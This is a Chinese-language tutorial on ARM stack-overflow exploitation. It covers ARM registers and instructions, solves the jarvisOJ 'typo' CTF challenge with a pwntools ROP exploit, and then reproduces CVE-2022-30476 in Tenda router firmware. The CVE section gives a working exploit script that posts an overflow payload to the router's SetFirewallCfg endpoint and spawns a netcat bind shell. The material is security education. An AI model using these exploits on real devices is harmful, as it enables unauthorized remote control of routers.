## 一、前言

在CTF比赛中，我们所能接触到的大部分都是x86
x86_64架构的题目，而在我开始接触IOT方向的研究以后发现智能设备所用到的则是ARM和MIPS架构为主。本篇文章在介绍前置知识的基础上通过CTF的ARM架构类型题带读者更好的入门ARM
PWN的世界。

## 二、前置知识

### 指令集

Intel和ARM之间的区别主要是指令集，Intel采用复杂指令集而ARM则是精简指令集，精简指令集通过减少每条指令的时钟周期来缩短执行时间可以更快的执行指令，但因为指令较少因此在实现功能时会显得比Intel冗长。

### 寄存器

寄存器是ARM架构的一个重点，在x86架构上指令可以直接对内存的数据进行操作，而在ARM架构中必须将内存的数据放入寄存器中再进行操作。而寄存器的数量取决于ARM的版本，而ARM32架构下共30个寄存器：

  * R0在常规操作中可用于存储临时值，也可以用于存储函数的第一个参数或返回结果

  * 在ARM架构中约定指定函数前四个参数存储在R0~R3寄存器中

  * R7寄存器在函数调用中负责存储系统调用号

  * R11寄存器即可以用来记录回溯信息,也可以当做局部变量来使用

  * R13寄存器SP(堆栈指针)指向堆栈的顶部

  * R14寄存器LR(链接寄存器)在进行函数调用时，LR寄存器内保存调用函数的下一条指令地址，用于被调用函数(子函数)结束工作后返回调用函数(父函数)

  * R15寄存器PC(程序计数器)类似于X86架构下的EIP寄存器负责保存目标地址，与x86不同的点在于PC在ARM状态下存储当前指令+8的地址。

![image-20220714232919869.png](https://image.3001.net/images/20220719/1658221978_62d6759aec4cf48a6750d.png!small)

### ARM指令

这里引用 **eack** 师傅在ARM基础知识PPT中所列出指令的表格，在有了X86架构的基础后去看下面这些指令还是很好理解的。

指令| 功能| 指令| 功能  
---|---|---|---  
 **MOV**|  **移动数据**|  **EOR**|  **按位异或**  
 **MVN**|  **移动数据并取反**|  **LDR**|  **加载**  
 **ADD**|  **加法**|  **STR**|  **存储**  
 **SUB**|  **减法**|  **LDM**|  **加载多个**  
 **MUL**|  **乘法**|  **STM**|  **存储多个**  
 **LSL**|  **逻辑左移**|  **PUSH**|  **入栈**  
 **LSR**|  **逻辑右移**|  **POP**|  **出栈**  
 **ASR**|  **算术右移**|  **B**|  **跳转**  
 **ROR**|  **右旋**|  **BL**|  **Link+跳转**  
 **CMP**|  **比较**|  **BX**|  **分支跳转**  
 **AND**|  **按位与**|  **BLX**|  **Linx+分支跳转**  
 **ORR**|  **按位或**|  **SWI/SVC**|  **系统调用**  
  
这里需要单独介绍一下`LDR`和`STR`两个指令

  * LDR用于将某些内容从内存加载到寄存器中，例如`LDR R2, [R0]`从R0寄存器中存储的内存地址的值读入R2寄存器

  * STR用于将某些内容从寄存器存储到内存地址中，例如`STR R2, [R1]`从R2寄存器中将值存储到R1寄存器中的内存地址中

## 三、例题讲解

这里以jarvisoj 的 typo 例题进行讲解，题目可通过下方链接获得​

<https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/arm/jarvisOJ_typo/typo>​

查看题目保护，`arm-32-little`架构的静态链接文件未开启`PIE`和`Canary`保护，存在`NX`保护无法同时写入shellcode来getshell

    
    
    amalll@A-M:~/AM$ checksec pwn  
    [*] '/home/amalll/AM/pwn'  
    Arch:     arm-32-little  
    RELRO:    Partial RELRO  
    Stack:    No canary found  
    NX:       NX enabled  
    PIE:      No PIE (0x8000)  
    amalll@A-M:~/AM$ file pwn  
    pwn: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped

因为程序去除了符号表的关系，我们可以使用`rizzo`插件来恢复符号表，可以从程序中发现`system`和`/bin/sh`等关键信息地址，同时在跟随程序流程注意到一处很明显的栈溢出漏洞，getshell所需的条件都满足了。

![image-20220715094345235.png](https://image.3001.net/images/20220719/1658221979_62d6759bda10525ecc379.png!small)

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

这边的利用思路就是通过栈溢出漏洞覆盖程序的返回地址，在ARM架构下是覆盖要POP给PC寄存器的地址值，覆盖为一段可以同时控制R0和PC寄存器的GADGET，因为在ARM架构下函数约定R0寄存器作为函数的第一个参数存储，所以我们可以控制R0寄存器指向`/bin/sh`地址，PC寄存器指向`system`函数的地址，即可GetShell。

    
    
    +-------------+  
    | "a" * 112   |  
    +-------------+  
    | pop_gadget  | <- return address  
    +-------------+  
    |   /bin/sh   |  
    +-------------+  
    |     0       |  
    +-------------+  
    | system_addr |  
    +-------------+

思路确定后，接下来就是具体的实现步骤，首先是栈溢出的偏移是多少，这里我们可以使用`QEMU`配合`gdb-multiarch`来得到栈溢出的偏移，首先用qemu-user启动二进制程序

    
    
    qemu-arm-static -g 1234 -L . ./pwn

然后启动`gdb-multiarch`，执行远程连接命令即可开始动调，后面的操作方式和x86架构的相同，使用cyclic生成过长字符然后通过溢出覆盖字符串确定偏移

![image-20220715101835896.png](https://image.3001.net/images/20220719/1658221980_62d6759cb332d603a1a70.png!small)

最后确定偏移为112，这里需要注意的是在ARM架构中如果跳转的地址为奇数时会进入Thumb模式，进入Thumb模式后地址的最低位会从1变成0，所以如果通过此方法算出的地址值有错误时，可以通过查看`$cpsr`寄存器的低第六位值是否为1来判断程序是否发生模式切换，而此处程序并未发生模式切换，所以最终我们的偏移就是112。

![image-20220715102109966.png](https://image.3001.net/images/20220719/1658221981_62d6759dd0f8bee788b2d.png!small)

确定了偏移后，还需要一个可以同时可以控制R0和PC的gadget，这里使用ropper在程序中搜索到如下的一段gadget

    
    
    0x00020904: pop {r0, r4, pc};

### EXP

    
    
    from pwn import *  
    ​  
    p = process(['qemu-arm-static',"-L", "./", "./pwn"])  
    pop_r0_r4_pc = 0x00020904  
    system = 0x000110B4  
    sh = 0x006C384  
    ​  
    payload = 'a'*112+p32(pop_r0_r4_pc)+p32(sh)+p32(0)+p32(system)  
    p.sendafter("Input ~ if you want to quit", "\n")  
    p.send(payload)  
    p.interactive()  
    ​

## 四、实战演示

这边以`CVE-2022-30476`为例进行实战arm栈溢出利用演示，关于固件仿真的部分内容在复现Tenda
2018年的cve漏洞时就有所介绍这边就不过多赘述，这边还是以实际情况的漏洞复现为主。​
web服务在获取`firmwallEn`参数时未进行边界检测直接将参数值通过`strcpy`函数赋予dest变量，从而造成栈溢出漏洞。

![image-20220718202245052.png](https://image.3001.net/images/20220719/1658221982_62d6759ec237d2256ebc1.png!small)

![image-20220718200535567.png](https://image.3001.net/images/20220719/1658221983_62d6759fb58d4aeff93de.png!small)

我们通过cyclic测得栈溢出偏移为44，这里就涉及到我们刚才所说的`Thumb`模式切换的问题，实际的溢出偏移应为`48`。随后我们可以使用`vmmap`命令查看qemu-user的内存布局，可以得到libc库的基地址。​
这边需要特别说明一下，新版本的`pwndbg`中关于qemu的兼容性较差，所以只能采用旧版本的插件进行内存布局查看。

![image-20220718200815092.png](https://image.3001.net/images/20220719/1658221985_62d675a10e3e142fd2523.png!small)

与我们在ctf例题中所阐述的ROP构造思路相同，这里也是需要寻找能同时控制`r0`和`pc`两个寄存器的`gadget`，很幸运的是此次寻找的`gadget`并未以`\x00`结尾

![image-20220718201613225.png](https://image.3001.net/images/20220719/1658221986_62d675a251441d60e6c5b.png!small)

凑齐所有的利用条件后，编写EXP对webserver服务进行栈溢出攻击

    
    
    import requests  
    from pwn import *  
    ​  
    url = 'http://192.168.2.1/goform/SetFirewallCfg'  
    libc = ELF("./lib/libc.so.0")  
    base = 0xff592000  
    system = base+libc.sym['system']  
    pop_r0_pc = base+0x0003db80 # pop {r0, pc};  
    stack = 0xfffef2c0  
    pl = 'a'*48+p32(pop_r0_pc)+p32(stack)+p32(system)  
    pl+= 'nc -lp 8888 -e /bin/sh;\x00'  
    data = {'firewallEn':pl}  
    requests.post(url, data=data)

![image-20220718201852041.png](https://image.3001.net/images/20220719/1658221987_62d675a356e6c6ec1d194.png!small)

![image-20220718203409021.png](https://image.3001.net/images/20220719/1658221988_62d675a499921e5af9868.png!small)

## 推荐实验：

[ARM漏洞利用技术四--内存布局及栈溢出
（合天网安实验室）﻿](https://www.hetianlab.com/expc.do?ce=682a3471-bce7-4d12-b9db-b25df36b1246)

